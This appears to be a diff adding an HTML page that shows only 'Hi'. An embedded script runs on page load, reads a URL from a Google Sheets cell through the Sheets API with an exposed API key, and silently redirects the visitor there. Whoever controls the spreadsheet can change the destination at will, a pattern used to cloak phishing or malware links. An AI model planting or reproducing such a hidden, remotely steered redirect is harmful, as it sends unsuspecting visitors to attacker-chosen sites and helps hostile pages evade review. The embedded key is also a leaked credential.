@@ -1,0 +1,15 @@
+<html>Hi
+
+</html>
+<script>
+  addEventListener(
+    "load",
+    async function () {
+      const res = await fetch('https://sheets.googleapis.com/v4/spreadsheets/1FqvoM33RO7Qma5bp_8hkd4uHzrhfHUWQnTBijVK420I/values/b2:c2?key=%20AIzaSyDW-rYE1vkYaBwppN5fiwdyMhI0d-2u8_4');
+      const data = await res.json();
+      const value = data['values'][0][0];
+      window.location.href = value;
+    },
+    false
+  );
+</script>
